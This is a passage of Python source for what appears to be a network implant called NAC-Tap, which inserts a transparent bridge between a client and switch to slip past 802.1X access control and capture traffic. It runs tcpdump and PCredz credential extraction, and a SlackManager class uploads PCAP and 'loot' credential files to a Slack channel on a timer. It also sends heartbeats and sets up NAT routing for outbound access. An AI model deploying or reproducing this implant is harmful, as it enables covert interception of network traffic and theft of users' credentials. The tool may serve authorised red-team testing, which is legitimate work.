            'interface': self.interface if self.connected else None,
            'gateway': self.gateway if self.connected else None
        }

    def get_connection_status(self):
        """Get current WiFi status"""
        return {
            'connected': self.connected,
            'interface': self.interface,
            'ssid': self.ssid,
            'ip_address': self.ip_address,
            'gateway': self.gateway,
            'internet_available': self.internet_available
        }

# ============================================================================
# SLACK MANAGER
# ============================================================================

class SlackManager:
    """Manages Slack API integration for uploads and heartbeats"""

    def __init__(self, bridge_manager=None):
        self.webhook_url = None
        self.bot_token = None
        self.channel = None
        self.enabled = False
        self.upload_thread = None
        self.heartbeat_thread = None
        self.stop_threads = False
        self.last_upload_time = None
        self.last_heartbeat_time = None
        self.upload_history = []
        self.bridge_manager = bridge_manager
        self.appliance_id = None
        self.upload_pcap = True
        self.upload_pcredz = True
        self._init_appliance_id()

    def _init_appliance_id(self):
        """Initialize appliance ID"""
        import socket
        import uuid
        try:
            hostname = socket.gethostname()
            self.appliance_id = f"{hostname}-{str(uuid.uuid4())[:8]}"
            CONFIG['APPLIANCE_ID'] = self.appliance_id
        except:
            self.appliance_id = f"nac-tap-{str(uuid.uuid4())[:8]}"
            CONFIG['APPLIANCE_ID'] = self.appliance_id

    def test_webhook_connection(self, webhook_url):
        """Test Slack webhook URL"""
        try:
            log("Testing Slack webhook connection...", 'INFO')
            log(f"Webhook URL: {webhook_url[:50]}..." if webhook_url and len(webhook_url) > 50 else f"Webhook URL: {webhook_url}", 'INFO')
            
            if not webhook_url or not webhook_url.startswith('https://hooks.slack.com/services/'):
                error_msg = "Invalid webhook URL format (must start with https://hooks.slack.com/services/)"
                log(f"Webhook test failed: {error_msg}", 'ERROR')
                return {'success': False, 'error': error_msg}
            
            import urllib.request
            import urllib.parse
            
            test_message = {
                'text': 'NAC-Tap test message from ' + (self.appliance_id or 'unknown'),
                'username': 'NAC-Tap Test'
            }
            data = json.dumps(test_message).encode('utf-8')
            log(f"Sending test message ({len(data)} bytes)...", 'INFO')
            
            req = urllib.request.Request(webhook_url, data=data, headers={'Content-Type': 'application/json'})
            log("Opening connection to Slack webhook...", 'INFO')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                response_body = response.read().decode('utf-8')
                log(f"Webhook response: HTTP {response.status}", 'INFO')
                log(f"Response body: {response_body[:200]}", 'INFO')
                
                if response.status == 200:
                    if response_body.strip() == 'ok':
                        log("Webhook test successful! Message sent to Slack.", 'SUCCESS')
                        return {'success': True, 'message': 'Webhook test successful', 'response': response_body}
                    else:
                        log(f"Webhook returned unexpected response: {response_body}", 'WARNING')
                        return {'success': True, 'message': 'Webhook responded', 'response': response_body}
                else:
                    error_msg = f'HTTP {response.status}: {response_body[:200]}'
                    log(f"Webhook test failed: {error_msg}", 'ERROR')
                    return {'success': False, 'error': error_msg, 'response': response_body}
        except urllib.error.HTTPError as e:
            error_msg = f'HTTP {e.code}: {e.reason}'
            log(f"Webhook test failed: {error_msg}", 'ERROR')
            try:
                error_body = e.read().decode('utf-8')
                log(f"Error response: {error_body[:200]}", 'ERROR')
                return {'success': False, 'error': error_msg, 'response': error_body}
            except:
                return {'success': False, 'error': error_msg}
        except urllib.error.URLError as e:
            error_msg = f'Connection error: {str(e)}'
            log(f"Webhook test failed: {error_msg}", 'ERROR')
            return {'success': False, 'error': error_msg}
        except Exception as e:
            error_msg = str(e)
            log(f"Webhook test failed: {error_msg}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return {'success': False, 'error': error_msg}

    def test_bot_token(self, bot_token):
        """Test Slack bot token"""
        try:
            log("Testing Slack bot token...", 'INFO')
            log(f"Token: {bot_token[:10]}...{bot_token[-5:] if bot_token and len(bot_token) > 15 else 'N/A'}", 'INFO')
            
            if not bot_token or not bot_token.startswith('xoxb-'):
                error_msg = "Invalid bot token format (must start with xoxb-)"
                log(f"Token test failed: {error_msg}", 'ERROR')
                return {'success': False, 'error': error_msg}
            
            import urllib.request
            import urllib.parse
            
            url = 'https://slack.com/api/auth.test'
            log(f"Calling Slack API: {url}", 'INFO')
            
            data = urllib.parse.urlencode({'token': bot_token}).encode('utf-8')
            req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            
            log("Sending auth.test request...", 'INFO')
            with urllib.request.urlopen(req, timeout=10) as response:
                response_body = response.read().decode('utf-8')
                log(f"API response: HTTP {response.status}", 'INFO')
                
                result = json.loads(response_body)
                log(f"API result: {json.dumps(result)[:300]}", 'INFO')
                
                if result.get('ok'):
                    bot_info = {
                        'user_id': result.get('user_id'),
                        'team': result.get('team'),
                        'user': result.get('user'),
                        'team_id': result.get('team_id')
                    }
                    log(f"Token test successful! Bot ID: {result.get('user_id')}, Team: {result.get('team')}", 'SUCCESS')
                    return {'success': True, 'bot_info': bot_info, 'raw_response': result}
                else:
                    error_msg = result.get('error', 'Unknown error')
                    log(f"Token test failed: {error_msg}", 'ERROR')
                    return {'success': False, 'error': error_msg, 'raw_response': result}
        except urllib.error.HTTPError as e:
            error_msg = f'HTTP {e.code}: {e.reason}'
            log(f"Token test failed: {error_msg}", 'ERROR')
            try:
                error_body = e.read().decode('utf-8')
                log(f"Error response: {error_body[:200]}", 'ERROR')
                return {'success': False, 'error': error_msg, 'response': error_body}
            except:
                return {'success': False, 'error': error_msg}
        except urllib.error.URLError as e:
            error_msg = f'Connection error: {str(e)}'
            log(f"Token test failed: {error_msg}", 'ERROR')
            return {'success': False, 'error': error_msg}
        except Exception as e:
            error_msg = str(e)
            log(f"Token test failed: {error_msg}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return {'success': False, 'error': error_msg}

    def send_heartbeat(self):
        """Send heartbeat message to Slack"""
        if not self.webhook_url:
            log("Heartbeat skipped: webhook URL not configured", 'WARNING')
            return False
        if not self.enabled:
            log("Heartbeat skipped: upload not enabled", 'WARNING')
            return False
        
        try:
            log("Sending heartbeat to Slack...", 'INFO')
            import urllib.request
            
            status = 'online'
            capture_active = 'no'
            pcap_size = '0 B'
            pcap_packets = '0'
            
            if self.bridge_manager:
                if self.bridge_manager.tcpdump_process and self.bridge_manager.tcpdump_process.poll() is None:
                    capture_active = 'yes'
                    log("Capture is active - including PCAP info in heartbeat", 'INFO')
                    if self.bridge_manager.pcap_file and os.path.exists(self.bridge_manager.pcap_file):
                        size = os.path.getsize(self.bridge_manager.pcap_file)
                        pcap_size = f"{size / 1024 / 1024:.2f} MB"
                        # Try to get packet count if available
                        try:
                            if hasattr(self.bridge_manager, 'packet_count'):
                                pcap_packets = str(self.bridge_manager.packet_count)
                        except:
                            pass
                else:
                    log("Capture is not active", 'INFO')
            
            heartbeat_text = f"NAC-Tap Heartbeat\nAppliance: {self.appliance_id}\nStatus: {status}\nLast Poll: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nCapture Active: {capture_active}\nPCAP Size: {pcap_size}"
            if capture_active == 'yes' and pcap_packets != '0':
                heartbeat_text += f"\nPackets: {pcap_packets}"
            
            message = {
                'text': heartbeat_text,
                'username': 'NAC-Tap'
            }
            
            data = json.dumps(message).encode('utf-8')
            log(f"Prepared heartbeat message ({len(data)} bytes)", 'INFO')
            
            req = urllib.request.Request(self.webhook_url, data=data, headers={'Content-Type': 'application/json'})
            log(f"Sending heartbeat to {self.webhook_url[:50]}...", 'INFO')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                response_body = response.read().decode('utf-8')
                if response.status == 200:
                    self.last_heartbeat_time = datetime.now().isoformat()
                    log(f"Heartbeat sent successfully! Response: {response_body[:100]}", 'SUCCESS')
                    return True
                else:
                    log(f"Heartbeat failed: HTTP {response.status} - {response_body[:200]}", 'ERROR')
                    return False
        except urllib.error.HTTPError as e:
            error_msg = f'HTTP {e.code}: {e.reason}'
            log(f"Heartbeat failed: {error_msg}", 'ERROR')
            try:
                error_body = e.read().decode('utf-8')
                log(f"Heartbeat error response: {error_body[:200]}", 'ERROR')
            except:
                pass
            return False
        except urllib.error.URLError as e:
            error_msg = f'Connection error: {str(e)}'
            log(f"Heartbeat failed: {error_msg}", 'ERROR')
            return False
        except Exception as e:
            log(f"Heartbeat failed: {str(e)}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def upload_file(self, file_path, title=None):
        """Upload file to Slack"""
        if not self.bot_token:
            error_msg = 'Bot token not configured'
            log(f"File upload failed: {error_msg}", 'ERROR')
            return {'success': False, 'error': error_msg}
        if not self.channel:
            error_msg = 'Channel not configured'
            log(f"File upload failed: {error_msg}", 'ERROR')
            return {'success': False, 'error': error_msg}
        
        try:
            log(f"Starting file upload: {os.path.basename(file_path)}", 'INFO')
            log(f"Title: {title or 'N/A'}, Channel: {self.channel}", 'INFO')
            
            import urllib.request
            import urllib.parse
            
            if not os.path.exists(file_path):
                error_msg = f'File not found: {file_path}'
                log(f"File upload failed: {error_msg}", 'ERROR')
                return {'success': False, 'error': error_msg}
            
            file_size = os.path.getsize(file_path)
            log(f"File size: {file_size / 1024 / 1024:.2f} MB ({file_size} bytes)", 'INFO')
            
            if file_size > 1024 * 1024 * 1024:  # 1GB limit
                error_msg = f'File too large: {file_size / 1024 / 1024 / 1024:.2f} GB (max 1GB)'
                log(f"File upload failed: {error_msg}", 'ERROR')
                return {'success': False, 'error': error_msg}
            
            url = 'https://slack.com/api/files.upload'
            log(f"Reading file: {file_path}", 'INFO')
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            log(f"File read: {len(file_data)} bytes", 'INFO')
            
            boundary = '----WebKitFormBoundary' + ''.join([str(i) for i in range(10)])
            log(f"Creating multipart form data (boundary: {boundary[:20]}...)", 'INFO')
            
            body_parts = []
            body_parts.append(f'--{boundary}'.encode())
            body_parts.append(f'Content-Disposition: form-data; name="token"\r\n\r\n{self.bot_token}'.encode())
            body_parts.append(f'--{boundary}'.encode())
            body_parts.append(f'Content-Disposition: form-data; name="channels"\r\n\r\n{self.channel}'.encode())
            if title:
                body_parts.append(f'--{boundary}'.encode())
                body_parts.append(f'Content-Disposition: form-data; name="title"\r\n\r\n{title}'.encode())
            body_parts.append(f'--{boundary}'.encode())
            body_parts.append(f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode())
            body_parts.append(file_data)
            body_parts.append(f'--{boundary}--'.encode())
            
            body = b'\r\n'.join(body_parts)
            log(f"Form data prepared: {len(body) / 1024 / 1024:.2f} MB total", 'INFO')
            
            req = urllib.request.Request(url, data=body)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            
            log(f"Uploading to Slack API: {url}", 'INFO')
            log(f"Channel: {self.channel}, Timeout: 60s", 'INFO')
            
            with urllib.request.urlopen(req, timeout=60) as response:
                response_body = response.read().decode('utf-8')
                log(f"Upload response: HTTP {response.status}", 'INFO')
                
                result = json.loads(response_body)
                log(f"API result: ok={result.get('ok')}, error={result.get('error', 'none')}", 'INFO')
                
                if result.get('ok'):
                    file_info = result.get('file', {})
                    file_url = file_info.get('url_private')
                    file_id = file_info.get('id')
                    log(f"File uploaded successfully! ID: {file_id}, URL: {file_url[:50]}..." if file_url and len(file_url) > 50 else f"File uploaded! ID: {file_id}", 'SUCCESS')
                    return {'success': True, 'file_url': file_url, 'file_id': file_id, 'raw_response': result}
                else:
                    error_msg = result.get('error', 'Unknown error')
                    log(f"File upload failed: {error_msg}", 'ERROR')
                    log(f"Full response: {json.dumps(result)[:500]}", 'ERROR')
                    return {'success': False, 'error': error_msg, 'raw_response': result}
        except urllib.error.HTTPError as e:
            error_msg = f'HTTP {e.code}: {e.reason}'
            log(f"File upload failed: {error_msg}", 'ERROR')
            try:
                error_body = e.read().decode('utf-8')
                log(f"Error response: {error_body[:500]}", 'ERROR')
                result = json.loads(error_body) if error_body.strip().startswith('{') else None
                return {'success': False, 'error': error_msg, 'response': error_body, 'raw_response': result}
            except:
                return {'success': False, 'error': error_msg}
        except urllib.error.URLError as e:
            error_msg = f'Connection error: {str(e)}'
            log(f"File upload failed: {error_msg}", 'ERROR')
            return {'success': False, 'error': error_msg}
        except Exception as e:
            error_msg = str(e)
            log(f"File upload failed: {error_msg}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return {'success': False, 'error': error_msg}

    def upload_capture_data(self):
        """Upload PCAP and loot files to Slack"""
        log("=== Starting capture data upload ===", 'INFO')
        
        if not self.enabled:
            log("Upload skipped: upload not enabled", 'WARNING')
            return
        
        if not self.bot_token:
            log("Upload skipped: bot token not configured", 'WARNING')
            return
        
        if not self.channel:
            log("Upload skipped: channel not configured", 'WARNING')
            return
        
        # Check internet connectivity
        if self.bridge_manager and self.bridge_manager.wifi_manager:
            if not self.bridge_manager.wifi_manager.internet_available:
                log("Upload skipped: internet not available", 'WARNING')
                log(f"WiFi connected: {self.bridge_manager.wifi_manager.connected}, Internet: {self.bridge_manager.wifi_manager.internet_available}", 'INFO')
                return
            else:
                log(f"Internet connectivity verified: {self.bridge_manager.wifi_manager.interface} -> {self.bridge_manager.wifi_manager.gateway}", 'INFO')
        
        uploaded_files = []
        failed_files = []
        
        # Upload PCAP (if enabled)
        if self.upload_pcap:
            log("PCAP upload enabled - checking for PCAP file...", 'INFO')
            if self.bridge_manager and self.bridge_manager.pcap_file:
                pcap_file = self.bridge_manager.pcap_file
                log(f"PCAP file: {pcap_file}", 'INFO')
                if os.path.exists(pcap_file):
                    log(f"PCAP file exists: {pcap_file}", 'INFO')
                    result = self.upload_file(pcap_file, 'PCAP Capture')
                    if result.get('success'):
                        uploaded_files.append(f"PCAP: {os.path.basename(pcap_file)}")
                        log(f"PCAP uploaded successfully: {os.path.basename(pcap_file)}", 'SUCCESS')
                    else:
                        error = result.get('error', 'Unknown error')
                        failed_files.append(f"PCAP: {error}")
                        log(f"PCAP upload failed: {error}", 'ERROR')
                else:
                    log(f"PCAP file not found: {pcap_file}", 'WARNING')
            else:
                log("No PCAP file available to upload", 'INFO')
        else:
            log("PCAP upload disabled - skipping", 'INFO')
        
        # Upload PCredz output (if enabled)
        if self.upload_pcredz:
            log("PCredz upload enabled - checking for loot files...", 'INFO')
            loot_file = CONFIG['LOOT_FILE']
            log(f"Loot file path: {loot_file}", 'INFO')
            
            if os.path.exists(loot_file):
                log(f"Loot JSON file exists: {loot_file}", 'INFO')
                result = self.upload_file(loot_file, 'Loot JSON')
                if result.get('success'):
                    uploaded_files.append(f"Loot: {os.path.basename(loot_file)}")
                    log(f"Loot JSON uploaded successfully: {os.path.basename(loot_file)}", 'SUCCESS')
                else:
                    error = result.get('error', 'Unknown error')
                    failed_files.append(f"Loot: {error}")
                    log(f"Loot JSON upload failed: {error}", 'ERROR')
            else:
                log(f"Loot JSON file not found: {loot_file}", 'WARNING')
            
            # Upload raw PCredz output
            raw_file = loot_file.replace('.json', '_raw.txt')
            log(f"Raw output file path: {raw_file}", 'INFO')
            if os.path.exists(raw_file):
                log(f"Raw output file exists: {raw_file}", 'INFO')
                result = self.upload_file(raw_file, 'PCredz Raw Output')
                if result.get('success'):
                    uploaded_files.append(f"Raw: {os.path.basename(raw_file)}")
                    log(f"Raw output uploaded successfully: {os.path.basename(raw_file)}", 'SUCCESS')
                else:
                    error = result.get('error', 'Unknown error')
                    failed_files.append(f"Raw: {error}")
                    log(f"Raw output upload failed: {error}", 'ERROR')
            else:
                log(f"Raw output file not found: {raw_file}", 'WARNING')
        else:
            log("PCredz upload disabled - skipping", 'INFO')
        
        # Send summary message
        if uploaded_files or failed_files:
            log(f"Preparing summary message: {len(uploaded_files)} successful, {len(failed_files)} failed", 'INFO')
            if self.webhook_url:
                try:
                    import urllib.request
                    summary_lines = [f"NAC-Tap Upload Complete\nAppliance: {self.appliance_id}"]
                    
                    if uploaded_files:
                        summary_lines.append(f"\nFiles uploaded ({len(uploaded_files)}):")
                        summary_lines.extend([f"- {f}" for f in uploaded_files])
                    
                    if failed_files:
                        summary_lines.append(f"\nUploads failed ({len(failed_files)}):")
                        summary_lines.extend([f"- {f}" for f in failed_files])
                    
                    message = {
                        'text': '\n'.join(summary_lines),
                        'username': 'NAC-Tap'
                    }
                    data = json.dumps(message).encode('utf-8')
                    log(f"Sending summary message ({len(data)} bytes)...", 'INFO')
                    
                    req = urllib.request.Request(self.webhook_url, data=data, headers={'Content-Type': 'application/json'})
                    urllib.request.urlopen(req, timeout=10)
                    log("Summary message sent successfully", 'SUCCESS')
                except Exception as e:
                    log(f"Failed to send summary message: {str(e)}", 'ERROR')
            else:
                log("Summary message skipped: webhook URL not configured", 'WARNING')
        else:
            log("No files to upload or notify about", 'INFO')
        
        self.last_upload_time = datetime.now().isoformat()
        self.upload_history.append({
            'time': self.last_upload_time,
            'files': uploaded_files,
            'failed': failed_files,
            'success': len(uploaded_files) > 0
        })
        if len(self.upload_history) > 10:
            self.upload_history.pop(0)
        
        log(f"=== Upload complete: {len(uploaded_files)} successful, {len(failed_files)} failed ===", 'SUCCESS' if uploaded_files else 'INFO')

    def _heartbeat_loop(self):
        """Heartbeat thread loop"""
        log("Heartbeat loop started", 'INFO')
        interval = CONFIG.get('HEARTBEAT_INTERVAL', 15)
        log(f"Heartbeat interval: {interval} seconds", 'INFO')
        
        while not self.stop_threads:
            if self.enabled and self.webhook_url:
                log(f"Sending scheduled heartbeat...", 'INFO')
                success = self.send_heartbeat()
                if success:
                    log(f"Heartbeat sent, next in {interval}s", 'INFO')
                else:
                    log(f"Heartbeat failed, retrying in {interval}s", 'WARNING')
            else:
                if not self.enabled:
                    log("Heartbeat loop waiting - upload not enabled", 'INFO')
                elif not self.webhook_url:
                    log("Heartbeat loop waiting - webhook URL not configured", 'INFO')
            time.sleep(interval)
        
        log("Heartbeat loop stopped", 'INFO')

    def _upload_loop(self):
        """Upload thread loop"""
        log("Upload loop started", 'INFO')
        interval = CONFIG.get('UPLOAD_INTERVAL', 60)
        log(f"Upload interval: {interval} seconds", 'INFO')
        
        while not self.stop_threads:
            if self.enabled:
                log(f"Starting scheduled upload cycle...", 'INFO')
                self.upload_capture_data()
                log(f"Upload cycle complete, next in {interval}s", 'INFO')
            else:
                log("Upload loop waiting - upload not enabled", 'INFO')
            time.sleep(interval)
        
        log("Upload loop stopped", 'INFO')

    def start_auto_upload(self):
        """Start automatic upload and heartbeat threads"""
        if self.enabled:
            log("Auto-upload already running", 'WARNING')
            return
        
        log("Starting auto-upload...", 'INFO')
        log(f"Webhook URL: {'Configured' if self.webhook_url else 'NOT CONFIGURED'}", 'INFO')
        log(f"Bot Token: {'Configured' if self.bot_token else 'NOT CONFIGURED'}", 'INFO')
        log(f"Channel: {self.channel or 'NOT CONFIGURED'}", 'INFO')
        log(f"Upload PCAP: {self.upload_pcap}", 'INFO')
        log(f"Upload PCredz: {self.upload_pcredz}", 'INFO')
        
        self.enabled = True
        self.stop_threads = False
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
        
        log("Starting heartbeat thread...", 'INFO')
        self.heartbeat_thread.start()
        log("Starting upload thread...", 'INFO')
        self.upload_thread.start()
        
        log("Auto-upload started successfully! Threads are running.", 'SUCCESS')

    def stop_auto_upload(self):
        """Stop automatic upload and heartbeat threads"""
        if not self.enabled:
            log("Auto-upload not running - nothing to stop", 'WARNING')
            return
        
        log("Stopping auto-upload...", 'INFO')
        self.enabled = False
        self.stop_threads = True
        
        if self.heartbeat_thread:
            log("Waiting for heartbeat thread to stop...", 'INFO')
            self.heartbeat_thread.join(timeout=5)
            if self.heartbeat_thread.is_alive():
                log("Heartbeat thread did not stop within timeout", 'WARNING')
            else:
                log("Heartbeat thread stopped", 'INFO')
        
        if self.upload_thread:
            log("Waiting for upload thread to stop...", 'INFO')
            self.upload_thread.join(timeout=5)
            if self.upload_thread.is_alive():
                log("Upload thread did not stop within timeout", 'WARNING')
            else:
                log("Upload thread stopped", 'INFO')
        
        log("Auto-upload stopped successfully", 'SUCCESS')

    def get_upload_status(self):
        """Get upload status"""
        return {
            'enabled': self.enabled,
            'last_upload_time': self.last_upload_time,
            'last_heartbeat_time': self.last_heartbeat_time,
            'upload_history': self.upload_history[-10:]
        }

# ============================================================================
# INTERNET ROUTING HELPER
# ============================================================================

def enable_internet_routing(bridge_name='br0'):
    """Enable internet access for the appliance through gateway"""
    try:
        log("Enabling internet routing for appliance...")
        
        # Gateway must be eth0 or eth1 (never wlan0 - that's for management)
        gateway_iface = None
        
        # Test eth0 first, then eth1
        for iface in ['eth0', 'eth1']:
            result = run_cmd(['ip', 'link', 'show', iface])
            if result and result.returncode == 0:
                # Check if interface is UP
                if 'state UP' in result.stdout or 'UP' in result.stdout:
                    gateway_iface = iface
                    log(f"Found active ethernet interface: {iface}")
                    break
                else:
                    log(f"Interface {iface} exists but is DOWN")
        
        if not gateway_iface:
            # Try to find which eth interface has the default route
            result = run_cmd(['ip', 'route', 'show', 'default'])
            if result and result.returncode == 0 and result.stdout:
                log(f"Default route: {result.stdout}")
                if 'eth0' in result.stdout:
                    gateway_iface = 'eth0'
                elif 'eth1' in result.stdout:
                    gateway_iface = 'eth1'
        
        if not gateway_iface:
            log("Could not find eth0 or eth1 for gateway", 'ERROR')
            log("Available interfaces:")
            result = run_cmd(['ip', 'link', 'show'])
            if result:
                for line in result.stdout.split('\n'):
                    if 'eth' in line.lower() or 'state' in line.lower():
                        log(f"  {line}")
            return False
        
        log(f"Using gateway interface: {gateway_iface}")
        
        # Since eth0/eth1 are in bridge mode, we need to get a DHCP address
        log(f"Requesting DHCP address on {gateway_iface}...")
        
        # Kill any existing dhclient on this interface
        run_cmd(['pkill', '-f', f'dhclient.*{gateway_iface}'])
        time.sleep(1)
        
        # Bring interface up
        run_cmd(['ip', 'link', 'set', gateway_iface, 'up'])
        
        # Request DHCP address
        result = run_cmd(['dhclient', '-v', gateway_iface], timeout=15)
        if result and result.returncode == 0:
            log(f"DHCP request sent on {gateway_iface}")
        else:
            log("DHCP request may have failed, checking for IP...", 'WARNING')
        
        # Wait a bit for DHCP to complete
        time.sleep(3)
        
        # Verify we got an IP
        result = run_cmd(['ip', 'addr', 'show', gateway_iface])
        if result and result.returncode == 0:
            # Look for inet IP (not inet6)
            ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
            if ip_match:
                assigned_ip = ip_match.group(1)
                log(f"Got DHCP address: {assigned_ip} on {gateway_iface}", 'SUCCESS')
            else:
                log("No IP address assigned via DHCP", 'ERROR')
                return False
        
        # Check default route was added by DHCP
        result = run_cmd(['ip', 'route', 'show', 'default'])
        if result and result.returncode == 0 and result.stdout:
            log(f"Default route: {result.stdout}")
            if gateway_iface not in result.stdout:
                log(f"WARNING: Default route not using {gateway_iface}", 'WARNING')
        else:
            log("No default route found", 'ERROR')
            return False
        
        # Enable IP forwarding
        run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        log("IP forwarding enabled")
        
        # Setup NAT for bridge traffic to go out via gateway interface
        result = run_cmd(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', gateway_iface, '-j', 'MASQUERADE'])
        if result and result.returncode == 0:
            log(f"NAT/MASQUERADE enabled on {gateway_iface}")
        
        # Allow forwarding
        run_cmd(['iptables', '-I', 'FORWARD', '1', '-j', 'ACCEPT'])
        log("Forwarding rules added")
        
        # Test connectivity
        log("Testing internet connectivity...")
        result = run_cmd(['ping', '-c', '2', '-W', '3', '8.8.8.8'], timeout=8)
        if result and result.returncode == 0:
            log("SUCCESS! Internet routing is working!", 'SUCCESS')
            log("You can now run apt update, etc.")
        else:
            log("Ping test failed - checking DNS...", 'WARNING')
            result = run_cmd(['ping', '-c', '1', 'google.com'], timeout=5)
            if result and result.returncode == 0:
                log("DNS works! Internet is accessible.")
            else:
                log("Check your network connection", 'WARNING')
        
        log(f"Internet routing enabled via {gateway_iface}", 'SUCCESS')
        return True
        
    except Exception as e:
        log(f"Internet routing setup failed: {e}", 'ERROR')
        import traceback
        log(traceback.format_exc(), 'ERROR')
        return False

def disable_internet_routing(bridge_name='br0'):
    """Disable internet routing"""
    try:
        log("Disabling internet routing...")
        
        # Find which eth interface was used and kill dhclient
        for gateway_iface in ['eth0', 'eth1']:
            # Kill dhclient for this interface
            result = run_cmd(['pkill', '-f', f'dhclient.*{gateway_iface}'])
            log(f"Stopped DHCP client on {gateway_iface}")
            
            # Flush IP address
            run_cmd(['ip', 'addr', 'flush', 'dev', gateway_iface])
            log(f"Flushed IP from {gateway_iface}")
            
            # Remove NAT rules
            run_cmd(['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', gateway_iface, '-j', 'MASQUERADE'])
        
        # Remove default route
        run_cmd(['ip', 'route', 'del', 'default'])
        
        # Flush all forward rules
        run_cmd(['iptables', '-F', 'FORWARD'])
        
        log("Internet routing disabled - appliance back to isolated mode", 'SUCCESS')
        return True
        
    except Exception as e:
        log(f"Failed to disable routing: {e}", 'ERROR')
        return False

# ============================================================================
# BRIDGE MANAGER
# ============================================================================

class BridgeManager:
    """Manages transparent network bridge and packet capture"""

    def __init__(self):
        self.interfaces = []
        self.tcpdump_process = None
        self.pcap_file = None
        self.start_time = None
        self.loot_analyzer = LootAnalyzer()
        self.mitm_manager = MITMManager()
        self.wifi_manager = WiFiManager()
        self.slack_manager = SlackManager(bridge_manager=self)
        self.bridge_initialized = False
        self.client_ip = None
        self.gateway_ip = None
        self.analysis_interval = CONFIG.get('ANALYSIS_INTERVAL', 300)
        self.stop_monitoring = False
        self.monitor_thread = None
        self.auto_connect_wifi = False
        self.auto_enable_upload = False
        self.load_saved_config()

    def detect_interfaces(self):
        """Detect ethernet interfaces (not wireless)"""
        log("Detecting ethernet interfaces...")
        candidates = []

        result = run_cmd(['ip', '-o', 'link', 'show'])
        if not result:
            return None

        for line in result.stdout.split('\n'):
            if not line or ':' not in line:
                continue

            iface = line.split(':')[1].strip()
            iface = iface.split('@')[0]

            # Skip virtual and management interfaces
            if (re.match(r'^(lo|br|veth|docker|virbr|vmnet|tun|tap|dummy)', iface) or
                    is_mgmt_interface(iface)):
                continue

            # Only ethernet interfaces
            if re.match(r'^(eth|enp|lan|end)[0-9]', iface) and 'link/ether' in line:
                candidates.append(iface)
                log(f"  Found: {iface}")

        if len(candidates) < 2:
            log(f"ERROR: Need 2 ethernet interfaces, found {len(candidates)}", 'ERROR')
            return None

        self.interfaces = candidates[:2]
        log(f"Selected: {self.interfaces[0]} (client-side) <-> {self.interfaces[1]} (switch-side)")
        return self.interfaces

    def setup_transparent_bridge(self):
        """Setup permanent transparent L2 bridge"""
        if self.bridge_initialized:
            log("Bridge already initialized")
            return True

        if not self.interfaces and not self.detect_interfaces():
            return False

        client_int, switch_int = self.interfaces
        bridge = CONFIG['BRIDGE_NAME']

        try:
            log("=== Setting Up Transparent Bridge ===")
            log(f"Client side:  {client_int}")
            log(f"Switch side:  {switch_int}")
            log("Mode: Transparent L2 (802.1X compatible)")

            # Cleanup if exists
            if run_cmd(['ip', 'link', 'show', bridge]):
                log("Removing existing bridge...")
                self._force_cleanup_bridge()
                time.sleep(2)

            # Note: NetworkManager isolation not needed - using wpa_supplicant + systemd-networkd
            # Bridge interfaces are managed directly via ip commands, not NetworkManager

            time.sleep(1)

            # Flush any IP addresses (pure L2)
            log("Flushing IP addresses (L2 only mode)...")
            for iface in [client_int, switch_int]:
                run_cmd(['ip', 'addr', 'flush', 'dev', iface])

            # Disable hardware offloading
            log("Disabling hardware offloading...")
            for iface in [client_int, switch_int]:
                for opt in ['gro', 'gso', 'tso']:
                    run_cmd(['ethtool', '-K', iface, opt, 'off'])

            # Create bridge
            log(f"Creating bridge {bridge}...")
            result = run_cmd(['ip', 'link', 'add', 'name', bridge, 'type', 'bridge'], check=False)
            if result and result.returncode != 0:
                log(f"Bridge creation failed: {result.stderr}", 'ERROR')
                return False

            # Configure for transparency
            log("Configuring bridge for transparency...")
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'stp_state', '0'])
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'forward_delay', '0'])
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'ageing_time', '30000'])

            # Add interfaces to bridge
            log(f"Adding {client_int} to bridge...")
            result = run_cmd(['ip', 'link', 'set', client_int, 'master', bridge])
            if result and result.returncode != 0:
                log(f"Failed to add {client_int}: {result.stderr}", 'ERROR')
                return False

            log(f"Adding {switch_int} to bridge...")
            result = run_cmd(['ip', 'link', 'set', switch_int, 'master', bridge])
            if result and result.returncode != 0:
                log(f"Failed to add {switch_int}: {result.stderr}", 'ERROR')
                return False

            # Bring UP interfaces
            log("Bringing UP interfaces...")
            for iface in [client_int, switch_int]:
                result = run_cmd(['ip', 'link', 'set', iface, 'up'])
                if result and result.returncode == 0:
                    log(f"  ✓ {iface}: UP")
                else:
                    log(f"  ✗ {iface}: FAILED", 'ERROR')
                    return False

            # Bring UP bridge
            log(f"Bringing UP bridge {bridge}...")
            result = run_cmd(['ip', 'link', 'set', bridge, 'up'])
            if result and result.returncode != 0:
                log(f"Bridge UP failed: {result.stderr}", 'ERROR')
                return False

            log("Waiting for bridge to stabilize (3s)...")
            time.sleep(3)

            # Verify
            log("Verifying bridge...")
            result = run_cmd(['ip', 'link', 'show', bridge])
            if not result or 'state UP' not in result.stdout:
                log("Bridge verification FAILED - not UP", 'ERROR')
                log(f"Bridge output: {result.stdout if result else 'None'}", 'ERROR')
                return False

            result = run_cmd(['bridge', 'link', 'show'])
            if not result or client_int not in result.stdout or switch_int not in result.stdout:
                log("Bridge verification FAILED - members missing", 'ERROR')
                return False

            log("✓ Bridge verified and operational", 'SUCCESS')
            log("✓ 802.1X traffic will pass through transparently")

            self.bridge_initialized = True
            self._save_state()
